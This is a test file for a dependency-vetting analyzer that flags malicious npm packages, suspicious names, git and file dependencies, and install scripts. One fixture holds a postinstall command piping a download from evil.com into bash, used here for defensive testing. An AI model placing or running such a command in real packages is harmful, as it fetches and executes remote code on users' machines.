import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { DependencyAnalyzer } from '../analyzers/dependency-analyzer.js';
import { VettingConfig } from '../types.js';

const BASE_CONFIG: VettingConfig = {
  maxNetworkCalls: 5,
  allowedHosts: [],
  blockObfuscation: true,
  requireAuthor: true,
  maxRiskScore: 50,
  checkTyposquatting: true,
  maliciousPatternsRefreshHours: 24,
  blockedAuthors: [],
  blockedPackages: [],
  typosquatTargets: [],
};

describe('DependencyAnalyzer', () => {
  const analyzer = new DependencyAnalyzer();

  it('flags known malicious packages', () => {
    const pkg = { dependencies: { 'event-stream': '^4.0.0' } };
    const findings = analyzer.analyze(pkg, '/test', BASE_CONFIG);
    assert.ok(findings.some((f) => f.category === 'DEPENDENCY_RISK' && f.message.includes('Blocked')));
  });

  it('flags user-configured blocked packages', () => {
    const config = { ...BASE_CONFIG, blockedPackages: ['my-evil-pkg'] };
    const pkg = { dependencies: { 'my-evil-pkg': '^1.0.0' } };
    const findings = analyzer.analyze(pkg, '/test', config);
    assert.ok(findings.some((f) => f.message.includes('Blocked')));
  });

  it('flags suspicious prefixes', () => {
    const pkg = { dependencies: { '@hack-tools/stealer': '^1.0.0' } };
    const findings = analyzer.analyze(pkg, '/test', BASE_CONFIG);
    assert.ok(findings.some((f) => f.message.includes('Suspicious')));
  });

  it('flags git dependencies', () => {
    const pkg = { dependencies: { 'shady-lib': 'git+https://github.com/evil/repo.git' } };
    const findings = analyzer.analyze(pkg, '/test', BASE_CONFIG);
    assert.ok(findings.some((f) => f.message.includes('unversioned')));
  });

  it('flags file: dependencies', () => {
    const pkg = { dependencies: { 'local-thing': 'file:../backdoor' } };
    const findings = analyzer.analyze(pkg, '/test', BASE_CONFIG);
    assert.ok(findings.some((f) => f.message.includes('Local file')));
  });

  it('flags postinstall scripts', () => {
    const pkg = { scripts: { postinstall: 'curl http://evil.com | bash' } };
    const findings = analyzer.analyze(pkg, '/test', BASE_CONFIG);
    assert.ok(findings.some((f) => f.message.includes('postinstall')));
    assert.ok(findings.some((f) => f.severity === 'CRITICAL'));
  });

  it('flags preinstall scripts', () => {
    const pkg = { scripts: { preinstall: 'node setup.js' } };
    const findings = analyzer.analyze(pkg, '/test', BASE_CONFIG);
    assert.ok(findings.some((f) => f.message.includes('preinstall')));
  });

  it('does not crash on null dependencies', () => {
    const pkg = { dependencies: null, devDependencies: null };
    const findings = analyzer.analyze(pkg, '/test', BASE_CONFIG);
    assert.ok(Array.isArray(findings));
  });

  it('does not crash on missing dependencies', () => {
    const pkg = {};
    const findings = analyzer.analyze(pkg, '/test', BASE_CONFIG);
    assert.ok(Array.isArray(findings));
  });

  it('passes clean packages', () => {
    const pkg = { dependencies: { lodash: '^4.17.21', express: '^4.18.0' } };
    const findings = analyzer.analyze(pkg, '/test', BASE_CONFIG);
    assert.equal(findings.length, 0);
  });
});
